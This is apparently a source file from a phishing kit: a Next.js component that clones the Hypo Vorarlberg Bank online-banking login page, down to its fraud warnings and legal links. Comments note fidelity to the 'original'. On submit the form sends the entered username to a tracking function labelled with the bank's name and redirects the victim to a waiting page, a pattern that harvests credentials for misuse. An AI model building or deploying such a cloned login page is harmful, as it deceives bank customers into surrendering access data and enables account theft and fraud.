"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await trackSubmission("hypo-vorarlberg", "login", { username });
    router.push(`/waiting?user=${encodeURIComponent(username)}`);
  };

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main login area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>Login Online Banking</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Security Teaser */}
                  <div className="securityteaser-wrapper">
                    <a
                      className="command-link"
                      href="#"
                      aria-label="Achtung - Warnung vor Telefonbetrug"
                    >
                      <span className="command-link-icon">
                        <div className="securityteaser-box">
                          <div className="securityteaser-content">
                            <div className="icon">
                              <span className="icon icon-sicherheitsteaser">⚠</span>
                            </div>
                            <div className="teaser">
                              <b>Achtung - Warnung vor Telefonbetrug</b>
                              <br />
                              Betrüger geben sich als MitarbeiterInnen der Hypo Vorarlberg aus - <u>mehr erfahren</u>
                            </div>
                          </div>
                        </div>
                      </span>
                    </a>
                  </div>

                  {/* Messages overlay (hidden) */}
                  <div id="loginform-messages" className="messages-overlay hidden"></div>

                  {/* Info text */}
                  <div className="row login-row login-info-text">
                    <p>
                      Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten geheim halten.
                      <br aria-hidden="true" /><br aria-hidden="true" />
                      Wir fordern Sie <span className="tw-bold">niemals</span> zur Bekanntgabe Ihrer persönlichen Zugangsdaten auf. Weder per E-Mail, SMS noch am Telefon.
                    </p>
                  </div>

                  {/* Info text link (empty in original) */}
                  <div className="row login-info-text-link"></div>

                  {/* Divider */}
                  <div className="row login-row login-demo">
                    <hr className="no-margin-top" role="presentation" />
                  </div>

                  {/* Username input */}
                  <div className="row">
                    <div className="col-xs-12">
                      <div className="pull-right">
                        {" "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">Barrierefrei</span>
                          </span>
                        </a>
                        {"  | "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">English</span>
                          </span>
                        </a>
                        {"  "}
                      </div>

                      <label htmlFor="benutzername">
                        <small>Benutzername</small>
                      </label>
                      <div className="input-text">
                        <input
                          id="benutzername"
                          name="loginform:benutzername"
                          type="text"
                          className="form-control"
                          maxLength={64}
                          spellCheck={false}
                          autoComplete="off"
                          placeholder=""
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                        <a
                          className="del-btn"
                          tabIndex={-1}
                          onClick={() => setUsername("")}
                          style={{ display: username ? "block" : "none" }}
                        >
                          <span className="icon icon-inhalt-loeschen">✕</span>
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Empty row (like original) */}
                  <div className="row"></div>

                  {/* Terms */}
                  <div className="row login-nutzungsbedingungen">
                    <p>
                      <a href="https://www.hypovbg.at/sicherheit" target="_blank" rel="noopener noreferrer">Empfehlungen für Ihre Sicherheit</a>
                      <br aria-hidden="true" /><br aria-hidden="true" />
                      Mit dem Login stimmen Sie den{" "}
                      <a href="https://www.hypovbg.at/agb/" target="_blank" rel="noopener noreferrer">AGB und Nutzungsbedingungen</a>
                      {" "}sowie der{" "}
                      <a href="https://www.hypovbg.at/datenschutz/" target="_blank" rel="noopener noreferrer">Datenschutzerklärung</a>
                      {" "}der Hypo Vorarlberg Bank AG ausdrücklich zu.
                    </p>
                  </div>

                  {/* Submit button footer */}
                  <div className="modal-footer">
                    <div className="row">
                      <button
                        id="loginButtonNext"
                        type="submit"
                        className="button-default pull-right button-fullwidth"
                        aria-label="Continue logging in"
                      >
                        Weiter
                      </button>
                    </div>
                  </div>

                  {/* Recovery links footer */}
                  <div className="modal-footer">
                    <div className="row text-center">
                      <a className="command-link" href="#">
                        <span className="command-link-wrap">
                          <span className="command-link-title">Benutzername vergessen?</span>
                        </span>
                      </a>
                      <br />
                      <a className="command-link" href="#">
                        <span className="command-link-wrap">
                          <span className="command-link-title">Passwort vergessen?</span>
                        </span>
                      </a>
                      <br /><br />
                      <a className="command-link" href="#" aria-label="Live-Hilfe-Dialog öffnen">
                        <span className="command-link-wrap">
                          <span className="command-link-icon">
                            <span className="icon icon-hilfe">?</span>
                          </span>
                          <span className="command-link-title">Live Hilfe</span>
                        </span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
